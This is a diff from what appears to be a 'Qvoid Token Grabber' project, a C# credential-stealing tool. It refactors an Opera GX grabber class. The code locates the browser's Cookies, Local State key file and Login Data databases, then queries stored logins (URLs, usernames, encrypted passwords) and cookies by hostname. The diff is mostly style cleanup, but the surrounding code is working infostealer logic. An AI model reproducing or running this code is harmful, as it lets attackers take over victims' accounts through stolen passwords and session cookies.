@@ -16,9 +16,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
 {
     class OperaGxGrabber
     {
-        public string OperaGxCookiePath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Opera Software\Opera GX Stable\Cookies";
-        public string OperaGxKeyPath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local State";
-        public string OperaGXPasswordsPath = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Opera Software\Opera GX Stable\Login Data";
+        public string OperaGxCookiePath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera GX Stable\Cookies", OperaGxKeyPath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera GX Stable\Local State", OperaGXPasswordsPath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Opera Software\Opera GX Stable\Login Data";
 
 
         public List<Passwords> GetPasswordByHostname(string hostName, byte[] key)
@@ -59,7 +57,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={OperaGXPasswordsPath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+                    cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
@@ -87,34 +85,19 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
         /// Returns a value depending on if the File "Login Data" was found
         /// </summary>
         /// <returns>true if Cookies was found and false if not</returns>
-        public bool PasswordsExists()
-        {
-            if (File.Exists(OperaGxCookiePath))
-                return true;
-            return false;
-        }
+        public bool PasswordsExists() => File.Exists(OperaGxCookiePath);
 
 
         /// <summary>
         /// Returns a value depending on if the File "Cookies" was found
         /// </summary>
         /// <returns>true if Cookies was found and false if not</returns>
-        public bool CookiesExists()
-        {
-            if (File.Exists(OperaGxCookiePath))
-                return true;
-            return false;
-        }
+        public bool CookiesExists() => File.Exists(OperaGxCookiePath);
         /// <summary>
         /// Returns a value depending on if the File "Local State" was found
         /// </summary>
         /// <returns>true if File was found and false if not</returns>
-        public bool KeyExists()
-        {
-            if (File.Exists(OperaGxKeyPath))
-                return true;
-            return false;
-        }
+        public bool KeyExists() => File.Exists(OperaGxKeyPath);
 
 
         public List<Cookie> GetCookiesByHostname(string hostName, byte[] key)
@@ -155,7 +138,7 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
                 using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={OperaGxCookiePath};pooling=false"))
                 using (var cmd = conn.CreateCommand())
                 {
-                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";
+                    cmd.CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
 
                     conn.Open();
                     using (var reader = cmd.ExecuteReader())
